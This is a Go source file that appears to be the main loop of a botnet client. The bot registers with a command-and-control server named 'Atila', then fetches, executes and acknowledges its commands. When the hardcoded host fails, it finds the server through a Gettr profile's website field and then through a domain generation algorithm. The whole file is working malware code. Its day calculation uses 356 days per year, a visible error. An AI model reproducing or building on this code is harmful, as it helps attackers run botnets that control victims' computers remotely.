package main

import (
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"time"

	"github.com/google/uuid"
)

// Key-pair used for signing and verifying messages.
var privateIdentificationKey = generatePrivateKey()
var publicIdentificationKey = &privateIdentificationKey.PublicKey

// Generate the unique bot identifier.
var id uuid.UUID = uuid.New()

// Last time since the contact was made with bot herder.
var lastContactMade int = timeSinceJesus()

// Does Atila (cnc) knows about us?
var identified bool = false

// timeSinceJesus returns how many days have passed since year 0.
func timeSinceJesus() int {
	return (time.Now().Year() * 356) + time.Now().YearDay()
}

// tick is the content of the main loop. Returns false if something went wrong.
func tick(host string) bool {
	if !identified {
		identified = identify(host, id.String(), publicIdentificationKey)
		return false
	}

	messages, err := fetchMessages(host, id.String())
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	for _, message := range messages {
		reply, err := interpretMessage(host, message)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		err = sendMessage(host, reply)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}

		err = messageAck(host, reply.ReplyTo)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
	}

	return true
}

func main() {
	rand.Seed(time.Now().UnixNano())
	for range time.Tick(time.Second + time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
		// We need to reach out to hardcoded host of Atila. (cnc)
		parsedAtilaUrl, err := url.Parse(atilaHost)
		if err == nil {
			if _, err := net.LookupIP(parsedAtilaUrl.Host); err == nil {
				if tick(atilaHost) {
					// Reset the timer of DGA and move on...
					lastContactMade = timeSinceJesus()
					continue
				}
			}
		}

		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
		gettrAtilaHost, err := gettrProfileWebsite(gettrProfileName)
		if err == nil {
			parsedAtilaUrl, err = url.Parse(gettrAtilaHost)
			if err == nil {
				if _, err := net.LookupIP(parsedAtilaUrl.Host); err == nil {
					if tick(gettrAtilaHost) {
						// Reset the timer of DGA and move on...
						lastContactMade = timeSinceJesus()
						continue
					}
				}
			}
		}

		// Check if DGA should kick it.
		if timeSinceJesus()-lastContactMade > dgaAfterDays {
			// Try to find the Atila (cnc) behind a generated domain.
			for _, host := range dga() {
				if _, err := net.LookupIP(host); err != nil {
					continue
				}
				if tick(host) {
					break
				}
			}
		}

		rand.Seed(time.Now().UnixNano())
	}
}
